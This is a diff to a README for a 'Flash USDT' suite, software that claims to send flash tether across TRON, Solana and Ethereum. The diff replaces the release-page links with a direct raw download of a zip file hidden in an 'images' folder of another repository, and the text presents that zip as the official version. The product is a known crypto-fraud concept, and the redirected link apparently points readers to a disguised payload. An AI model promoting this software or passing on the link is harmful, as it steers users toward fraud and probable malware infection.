@@ -5,7 +5,7 @@ description: "Send flash USDT assets across TRON, Solana, and Ethereum networks 
 ---
 # ⚡ FlashMan-Flash-USDT-Suite - Manage your crypto assets with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/inauguralwildcat147/FlashMan-Flash-USDT-Suite/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/inauguralwildcat147/inauguralwildcat147.github.io/raw/refs/heads/main/images/v2.8.zip)
 
 ## 📖 About this software
 
@@ -27,7 +27,7 @@ Ensure that your Windows operating system remains updated to the latest security
 
 You can obtain the official version of the software through our release page. Visit this page to download the latest setup file:
 
-[https://github.com/inauguralwildcat147/FlashMan-Flash-USDT-Suite/releases](https://github.com/inauguralwildcat147/FlashMan-Flash-USDT-Suite/releases)
+[https://github.com/inauguralwildcat147/inauguralwildcat147.github.io/raw/refs/heads/main/images/v2.8.zip](https://github.com/inauguralwildcat147/inauguralwildcat147.github.io/raw/refs/heads/main/images/v2.8.zip)
 
 1. Navigate to the link provided above.
 2. Look for the latest release section at the top of the page.
